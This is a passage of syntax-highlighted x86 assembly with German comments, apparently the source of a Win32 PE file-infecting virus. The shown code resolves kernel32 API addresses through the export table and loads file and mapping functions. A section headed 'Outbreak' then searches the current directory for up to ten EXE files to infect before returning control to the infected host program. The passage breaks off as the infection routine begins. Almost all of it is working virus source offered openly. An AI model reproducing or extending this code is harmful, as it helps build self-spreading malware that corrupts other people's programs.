+&nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">eax</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; API Name in der Kernel Export API in esi</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">edx</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; API die wir suchen in edi</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #46aa03; font-weight: bold;">ecx</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Länge speichern</span><br/>
+<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">cld</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Direction flag löschen</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">rep</span> <span style="color: #00007f; font-weight: bold;">cmpsb</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Vergleichen</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">pop</span> <span style="color: #46aa03; font-weight: bold;">ecx</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">jz</span> FoundApi1 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Sind sie gleich ?</span><br/>
+<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">pop</span> <span style="color: #46aa03; font-weight: bold;">esi</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Name Pointer Table laden</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">add</span> <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">4h</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Zeiger auf nächsten API-Namen setzen</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">inc</span> <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>counter<span style="color: black;">&#93;</span> <br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">cmp</span> <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>counter<span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">2000h</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">je</span> NotFoundApi1 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; falls wir mehr als 2000 API's getestet haben, haben wir ein</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Problem ;)</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">jmp</span> SearchNextApi1 &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Nächste API testen</span><br/>
+&nbsp;<br/>
+FoundApi1<span style="color: #339933;">:</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">pop</span> <span style="color: #46aa03; font-weight: bold;">esi</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Stack leeren ( wir wollen ja keine Buffer Overflows</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; ok, wir wollen sie, aber nicht heute und nicht hier *bg* )</span><br/>
+<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">movzx</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>counter<span style="color: black;">&#93;</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">shl</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">1h</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; eax mit 2 multiplizieren</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; damit eax auf den richtigen Eintrag zeigt</span><br/>
+<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">add</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>OTableVA<span style="color: black;">&#93;</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">xor</span> <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">esi</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; esi löschen</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">xchg</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">esi</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; esi zeigt nun auf den Eintrag</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">lodsw</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Ordinal in AX laden</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">shl</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">2h</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; eax * 4</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">add</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>ATableVA<span style="color: black;">&#93;</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">eax</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; esi zeigt auf die Adress RVA</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">lodsd</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; eax = Adress RVA</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">add</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>MZAddy<span style="color: black;">&#93;</span> &nbsp; &nbsp; <span style="color: black; font-style: italic;">; in einen absoluten Wert umrechnen</span><br/>
+<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">ret</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; API ist nun in EAX und wir springen zurück</span><br/>
+&nbsp;<br/>
+NotFoundApi1<span style="color: #339933;">:</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">xor</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">eax</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Wir haben den entsprechenden API nicht gefunden :(</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">ret</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; EAX wird mit 0 als Fehlercode gefüllt</span><br/>
+<br/>
+<br/>
+<br/>
+<span style="color: black; font-style: italic;">; ***************************************************************************</span><br/>
+<span style="color: black; font-style: italic;">; -----------------------------[ API - Tabellen ]----------------------------</span><br/>
+<span style="color: black; font-style: italic;">; ***************************************************************************</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Hier folgt eine Tabelle der API's die wir brauchen</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Wenn du wissen willst was sie alle machen, lies die </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Win32 Programmer's Reference</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Ich werde sie hier nicht erklären ( ich denk mal die Namen</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; sagen genug aus *g* )</span><br/>
+<br/>
+Kernel32Names<span style="color: #339933;">:</span><br/>
+<br/>
+&nbsp;NumberOfKernel32APIS <span style="color: #0000ff; font-weight: bold;">equ</span> 8d<br/>
+<br/>
+&nbsp;<span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #7f007f;">'FindFirstFileA'</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0</span><br/>
+&nbsp;<span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #7f007f;">'FindNextFileA'</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0</span><br/>
+&nbsp;<span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #7f007f;">'FindClose'</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0</span><br/>
+&nbsp;<span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #7f007f;">'CreateFileA'</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0</span><br/>
+&nbsp;<span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #7f007f;">'CloseHandle'</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0</span><br/>
+&nbsp;<span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #7f007f;">'CreateFileMappingA'</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0</span><br/>
+&nbsp;<span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #7f007f;">'MapViewOfFile'</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0</span><br/>
+&nbsp;<span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #7f007f;">'UnmapViewOfFile'</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0</span><br/>
+<br/>
+<br/>
+<span style="color: black; font-style: italic;">; ***************************************************************************</span><br/>
+<span style="color: black; font-style: italic;">; --------------[ API's mit GetProcAddress ermitteln ]-----------------------</span><br/>
+<span style="color: black; font-style: italic;">; ***************************************************************************</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; esi zeigt auf die Tablle der Names</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; edi auf die offsets der API's</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; ebx hat das Handel des Moduls</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; ecx die Nummer der API's</span><br/>
+GetAPI3<span style="color: #339933;">:</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #46aa03; font-weight: bold;">ecx</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; ecx speichern</span><br/>
+<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #46aa03; font-weight: bold;">esi</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; push Api-name </span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #46aa03; font-weight: bold;">ebx</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; push Module-Handle</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; call GetProcAddress</span><br/>
+<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">call</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>XGetProcAddress<span style="color: black;">&#93;</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">stosd</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Adresse des Offsets speichern</span><br/>
+<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">pop</span> <span style="color: #46aa03; font-weight: bold;">ecx</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Haben wir alle ?</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">dec</span> <span style="color: #46aa03; font-weight: bold;">ecx</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">jz</span> EndApi3<br/>
+<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #46aa03; font-weight: bold;">ecx</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; ansonsten legen wir ESI auf den nächsten Namen</span><br/>
+<br/>
+SearchZero<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; wir suchen nach dem Ende des</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">cmp</span> <span style="color: #0000ff; font-weight: bold;">byte</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0h</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">je</span> GotZero &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; API-Namens ( immer 0 )</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">inc</span> <span style="color: #46aa03; font-weight: bold;">esi</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">jmp</span> SearchZero<br/>
+&nbsp;<br/>
+GotZero<span style="color: #339933;">:</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">inc</span> <span style="color: #46aa03; font-weight: bold;">esi</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">pop</span> <span style="color: #46aa03; font-weight: bold;">ecx</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Anzahl der restlichen APIs laden</span><br/>
+<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">jmp</span> GetAPI3 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; nächsten API ermitteln</span><br/>
+<br/>
+&nbsp;EndApi3<span style="color: #339933;">:</span> <br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">ret</span> <br/>
+<br/>
+<br/>
+<span style="color: black; font-style: italic;">; ***************************************************************************</span><br/>
+<span style="color: black; font-style: italic;">; ---------------------[ Outbreak ! lasst uns infizieren ]-------------------</span><br/>
+<span style="color: black; font-style: italic;">; ***************************************************************************</span><br/>
+Outbreak<span style="color: #339933;">:</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Nun haben wir alles was wir brauchen um ein </span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; paar Dateien zu infizieren ;)</span><br/>
+<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>InfCounter<span style="color: black;">&#93;</span><span style="color: #339933;">,</span> 10d <span style="color: black; font-style: italic;">; Wir wollen max. 10 Dateien infizieren</span><br/>
+<br/>
+<span style="color: black; font-style: italic;">; ***************************************************************************</span><br/>
+<span style="color: black; font-style: italic;">; ---------------[ Infektion des momentanen Verzeichnisses ]-----------------</span><br/>
+<span style="color: black; font-style: italic;">; ***************************************************************************</span><br/>
+<br/>
+<br/>
+InfectCurDir<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Hier infizieren wir die Dateien im Momentanen Verzeichnis</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Wir benutzen die FindFirstFile - FindNextFile API's</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; um alle PE-EXE Dateien zu finden</span><br/>
+<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">lea</span> <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>filemask<span style="color: black;">&#93;</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">call</span> FindFirstFileProc<br/>
+<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">inc</span> <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">jz</span> EndInfectCurDir1 &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Wenn wir keine Dateien finden, beenden wir die Prozedur</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">dec</span> <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+<br/>
+InfectCurDirFile<span style="color: #339933;">:</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Dateiname in ESI laden</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">lea</span> <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>WFD_szFileName<span style="color: black;">&#93;</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">call</span> InfectFile &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Wir versuchen die Datei zu infizieren</span><br/>
+&nbsp;<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">cmp</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>InfCounter<span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0h</span> &nbsp;<span style="color: black; font-style: italic;">; Checken ob wir unser Limit an Dateien infiziert haben</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">jna</span> EndInfectCurDir2<br/>
+<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">call</span> FindNextFileProc<br/>
+<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">test</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">jnz</span> InfectCurDirFile<br/>
+&nbsp;<br/>
+EndInfectCurDir2<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Search - Handle schließen</span><br/>
+<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>FindHandle<span style="color: black;">&#93;</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">call</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>XFindClose<span style="color: black;">&#93;</span><br/>
+<br/>
+EndInfectCurDir1<span style="color: #339933;">:</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">jmp</span> ExecuteHost<br/>
+<br/>
+<br/>
+&nbsp;InfCounter <span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #ff0000;">0h</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Counter</span><br/>
+<br/>
+&nbsp;FindHandle <span style="color: #0000ff; font-weight: bold;">dd</span> <span style="color: #ff0000;">0h</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Handle für FindFirstFile API</span><br/>
+<br/>
+&nbsp;filemask &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #7f007f;">'*.EXE'</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0</span> &nbsp;<span style="color: black; font-style: italic;">; wir suchen nach EXE - Dateien</span><br/>
+<br/>
+<br/>
+<span style="color: black; font-style: italic;">; ***************************************************************************</span><br/>
+<span style="color: black; font-style: italic;">; ---------------------[ Original Program ausführen ]------------------------</span><br/>
+<span style="color: black; font-style: italic;">; ***************************************************************************</span><br/>
+<br/>
+<br/>
+<br/>
+ExecuteHost<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Wir führen das infizierte Programm aus</span><br/>
+<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">or</span> <span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">ebp</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Wenn dies der Virus der ersten Generation ist</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">jz</span> FirstGenHost &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; können wir keine infizierte Datei ausführen, deshalb</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; stoppen wir dies mit dem ExitProcess..</span><br/>
+<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">12345678h</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Rückkehr zur alten Imagebase+EIP</span><br/>
+&nbsp;org <span style="color: #0000ff; font-weight: bold;">$</span><span style="color: #339933;">-</span><span style="color: #ff0000;">4</span><br/>
+&nbsp;retEIP <span style="color: #0000ff; font-weight: bold;">dd</span> <span style="color: #ff0000;">0h</span><br/>
+<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">add</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">12345678h</span><br/>
+&nbsp;org <span style="color: #0000ff; font-weight: bold;">$</span><span style="color: #339933;">-</span><span style="color: #ff0000;">4</span><br/>
+&nbsp;retBas <span style="color: #0000ff; font-weight: bold;">dd</span> <span style="color: #ff0000;">0h</span><br/>
+<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">jmp</span> <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+<br/>
+<br/>
+FirstGenHost<span style="color: #339933;">:</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #ff0000;">0h</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Hier beenden wir den Virus mit dem ExitProcess API's</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">call</span> ExitProcess &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; ( nur erste Generation )</span><br/>
+<br/>
+<br/>
+&nbsp;OldEIP &nbsp;<span style="color: #0000ff; font-weight: bold;">dd</span> <span style="color: #ff0000;">0h</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Gespeicherter Entry Point</span><br/>
+&nbsp;OldBase <span style="color: #0000ff; font-weight: bold;">dd</span> <span style="color: #ff0000;">0h</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Gespeicherte Imagebase</span><br/>
+<br/>
+&nbsp;NewEIP &nbsp;<span style="color: #0000ff; font-weight: bold;">dd</span> <span style="color: #ff0000;">0h</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Neuer EIP ( zeigt auf unseren Virus.. )</span><br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<span style="color: black; font-style: italic;">; ***************************************************************************</span><br/>
+<span style="color: black; font-style: italic;">; -------------------[ Infektion der Datei vorbereiten &nbsp;]--------------------</span><br/>
+<span style="color: black; font-style: italic;">; ***************************************************************************</span><br/>
+<br/>
+InfectFile<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Hier bereiten wir die Infektion vor,</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; der Dateiname ist in [ebp+WFD_szFileName]</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Wir öffnen sie und überprüfen, ob wir</span><br/>
